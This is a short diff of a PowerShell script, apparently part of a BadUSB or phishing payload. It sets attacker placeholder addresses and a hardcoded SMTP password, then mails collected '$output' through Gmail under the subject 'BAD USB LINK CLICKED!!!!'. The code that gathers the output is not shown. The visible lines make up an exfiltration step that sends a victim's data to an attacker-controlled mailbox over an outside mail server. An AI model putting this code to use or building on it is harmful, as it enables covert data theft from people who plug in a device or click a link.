@@ -53,10 +53,10 @@ Param ()
 }
 
 $SmtpServer = 'smtp.gmail.com'
-$SmtpUser = 'test@gmail.com'
+$SmtpUser = 'attacker@gmail.com'
 $smtpPassword = '123'
 $MailtTo = 'victim@gmail.com'
-$MailFrom = 'firmusphising@gmail.com'
+$MailFrom = 'attacker@gmail.com'
 $MailSubject = "BAD USB LINK CLICKED!!!!"
 $Content  = $output
 $Credentials = New-Object System.Management.Automation.PSCredential -ArgumentList $SmtpUser, $($smtpPassword | ConvertTo-SecureString -AsPlainText -Force) 
